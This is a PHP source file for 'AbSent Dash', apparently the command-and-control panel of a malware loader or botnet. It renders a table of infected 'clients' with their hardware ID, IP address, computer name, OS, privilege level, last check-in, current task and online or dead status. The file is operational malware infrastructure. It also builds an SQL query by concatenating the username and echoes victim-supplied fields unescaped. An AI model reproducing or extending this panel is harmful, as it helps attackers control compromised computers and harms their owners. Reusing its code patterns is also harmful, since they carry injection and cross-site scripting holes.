<?php
include '../include/session.php';
include '../include/geo.php';
include '../include/stats.php';
$userperms = $odb->query("SELECT permissions FROM users WHERE username = '".$username."'")->fetchColumn(0);
?>
<html lang="en" xmlns="http://www.w3.org/1999/html">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>AbSent Dash</title>
    <link href='https://fonts.googleapis.com/css?family=Roboto:400,500,300,100,700,900' rel='stylesheet' type='text/css'>
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
    <!-- inject:css -->
    <link rel="stylesheet" href="../css/lib/getmdl-select.min.css">
    <link rel="stylesheet" href="../css/lib/nv.d3.css">
    <link rel="stylesheet" href="../css/application.css">
    <!-- endinject -->
</head>
<body>
<div class="mdl-layout mdl-js-layout mdl-layout--fixed-drawer mdl-layout--fixed-header is-small-screen">
    <header class="mdl-layout__header">
        <div class="mdl-layout__header-row">
            <div class="mdl-layout-spacer"></div>

            <div class="avatar-dropdown" id="icon">
            <span><?php echo $username; ?></span>
                <img src="../images/avatar.png">
            </div>

            <!-- Account dropdawn-->
            <ul class="mdl-menu mdl-list mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect mdl-shadow--2dp account-dropdown"
                for="icon">
                <li class="mdl-list__item mdl-list__item--two-line">
                    <span class="mdl-list__item-primary-content">
                    <span><?php echo $username; ?></span>
                    <span class="mdl-list__item-sub-title"><?php echo $userperms; ?></span>
                    </span>
                </li>
                <li class="list__item--border-top"></li>
                <li class="mdl-menu__item mdl-list__item">
                    <a href="account.php" class="mdl-list__item-primary-content">
                        <i class="material-icons mdl-list__item-icon">account_circle</i>
                        My account
                    </a>
                </li>
                <li class="mdl-menu__item mdl-list__item">
                    <a href="settings.php" class="mdl-list__item-primary-content">
                        <i class="material-icons mdl-list__item-icon">settings</i>
                       Settings
                    </a>
                </li>
                <li class="mdl-menu__item mdl-list__item">
                    <a href="../include/logout.php?logout=1" class="mdl-list__item-primary-content">
                        <i class="material-icons mdl-list__item-icon">exit_to_app</i>
                        Logout
                    </a>
                </li>
                
        </div>
    </header>

    <div class="mdl-layout__drawer">
        <header>AbSent</header>
        <nav class="mdl-navigation">
            <a class="mdl-navigation__link" href="index.php">
                <i class="material-icons" role="presentation">dashboard</i>
                Dashboard
            </a>
            <a class="mdl-navigation__link mdl-navigation__link--current" href="clients.php">
                <i class="material-icons" role="presentation">person</i>
                Clients
            </a>
            <a class="mdl-navigation__link" href="tasks.php">
                <i class="material-icons" role="presentation">map</i>
                Tasks
            </a>
        </nav>
    </div>
    <main class="mdl-layout__content">
        <div class="mdl-grid">

            <div class="mdl-cell mdl-cell--12-col">
                <div class="mdl-card mdl-shadow--2dp">
                    <div class="mdl-card__title">
                        <h2 class="mdl-card__title-text">Clients</h2>
                    </div>
                    <div class="mdl-card__supporting-text no-padding">
                        <table class="mdl-data-table mdl-js-data-table full-width">
                            <thead>
                                <tr>
                                    <th class="mdl-data-table__cell--non-numeric">#</th>
                                    <th class="mdl-data-table__cell--non-numeric">HWID</th>
                                    <th class="mdl-data-table__cell--non-numeric">Build Name</th>
                                    <th class="mdl-data-table__cell--non-numeric">Ip Address</th>
                                    <th class="mdl-data-table__cell--non-numeric">Computer Name</th>
                                    <th class="mdl-data-table__cell--non-numeric">Operating System</th>
                                    <th class="mdl-data-table__cell--non-numeric">Privilege</th>
                                    <th class="mdl-data-table__cell--non-numeric">Last Knock</th>
                                    <th class="mdl-data-table__cell--non-numeric">Current Task</th>
                                    <th class="mdl-data-table__cell--non-numeric">Status</th>
                                    <th class="mdl-data-table__cell--non-numeric">Mark</th>
                                </tr>
                            </thead>
                            <tbody>
                            <?php
                            $bots = $odb->query("SELECT * FROM clients ORDER BY id DESC");
                            $unix = $odb->query("SELECT UNIX_TIMESTAMP()")->fetchColumn(0);
                            while ($b = $bots->fetch(PDO::FETCH_ASSOC))
                            {
                                $id = $b['id'];
                                $hwid = $b['hwid'];
                                $buildName = $b['buildName'];
                                $ipAddr = $b['ipAddr'];
                                $computerName = $b['computerName'];
                                $operatingSystem = $b['operatingSystem'];
                                $privilege = $b['privilege'];
                                $lastKnock = $b['lastKnock'];
                                $lastKnockD = date("m-d-Y, h:i A", $lastKnock);
                                $currentTask = $b['currentTask'];
                                $st = "";
                                $mk = "";
                                if (($lastKnock + ($knock + 120)) > $unix)
                                {
                                    $st = '<font style="color: #4CAF50;">Online</font>';
                                }else{
                                if ($lastKnock + $deadi < $unix)
                                {
                                    $st = '<font style="color: #F44336;">Dead</font>';
                                }else{
                                    $st = '<font style="color: #FF9800;">Offline</font>';
                                }
                                }
                                if ($b['mark'] == "1")
                                {
                                    $mk = '<font style="color: #4CAF50;">Clean</font>';
                                    }else{
                                    $mk = '<font style="color: #F44336;">Dirty</font>';
                                }
                                echo '<tr>';
                                echo '  <td class="mdl-data-table__cell--non-numeric">'.$id.'</td>';
                                echo '  <td class="mdl-data-table__cell--non-numeric"><a id="details" data-toggle="tooltip" title="View All Details" href="details.php?id='.$id.'">'.$hwid.'</a></td>';
                                echo '  <td class="mdl-data-table__cell--non-numeric">'.$buildName.'</td>';
                                echo '  <td class="mdl-data-table__cell--non-numeric">'.$ipAddr.'</td>';
                                echo '  <td class="mdl-data-table__cell--non-numeric">'.$computerName.'</td>';
                                echo '  <td class="mdl-data-table__cell--non-numeric">'.$operatingSystem.'</td>';
                                echo '  <td class="mdl-data-table__cell--non-numeric">'.$privilege.'</td>';
                                echo '  <td class="mdl-data-table__cell--non-numeric">'.timeAgo($lastKnock).'</td>';
                                echo '  <td class="mdl-data-table__cell--non-numeric">'.$currentTask.'</td>';
                                echo '  <td class="mdl-data-table__cell--non-numeric">'.$st.'</td>';
                                echo '  <td class="mdl-data-table__cell--non-numeric">'.$mk.'</td>';
                                echo '</tr>';
                            }
                            ?>
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>

        </div>

    </main>
</div>

<!-- inject:js -->
<script src="../js/d3.js"></script>
<script src="../js/getmdl-select.min.js"></script>
<script src="../js/material.js"></script>
<script src="../js/nv.d3.js"></script>
<!-- endinject -->

</body>
</html>
